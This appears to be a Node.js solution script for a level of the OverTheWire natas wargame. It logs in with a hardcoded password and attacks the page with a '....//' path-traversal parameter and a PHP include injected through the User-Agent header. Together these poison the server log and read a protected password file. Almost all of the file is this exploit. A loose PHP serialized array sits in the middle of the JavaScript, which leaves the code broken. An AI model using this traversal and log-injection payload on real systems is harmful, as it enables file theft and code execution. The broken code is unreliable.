let username = 'natas26';
let password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T';

let sourceextension = '_source.php';
let sourcename = username + sourceextension; 

const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'),
      Entities = require('html-entities').AllHtmlEntities,
      rp = require('request-promise').defaults({transform : autoParse})
      qs = require('querystring');

const entities = new Entities();

function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}


a:2:
{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:2:"10";s:2:"y2";s:2:"10";}i:1;a:4:{s:2:"x1";s:2:"30";s:2:"y1";s:2:"10";s:2:"x2";s:3:"200";s:2:"y2";s:3:"400";}}


fs.readdir(__dirname, (err, files) => {
    if(!files.filter(file => file == sourcename).length){
        console.log('getSourceFile');
        getSourceFile(files);
    };
})


let options = {
    uri: `http://${username}.natas.labs.overthewire.org/index.php`,
    qs: {
        lang: '....//logs/natas25_test.log'
    },
    headers: {
        'Cookie': 'PHPSESSID=test',
        'User-Agent': "<? include '/etc/natas_webpass/natas26' ?>" 
    }
}

rp(options)
    .auth(username, password)
    .then($ => {
        //console.log($.text());
        console.log($.text().trim().match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0])   
    });





function getSourceFile(files){
    files.filter(file => file.includes(sourceextension)).forEach(file => {
        fs.unlinkSync(__dirname + '/' + file);
    });
    rp(`http://${username}.natas.labs.overthewire.org/index-source.html`)
    .auth(username, password)
    .then($ => {
        fs.writeFile(__dirname + '/' + sourcename, 
            entities.decode(
                $.html()
                    .replace(/<br>/g, '')
                    .replace(/&#xA0;/g, ' ')
            ),
            () => {}
        );
        console.log($.html());
    });
}
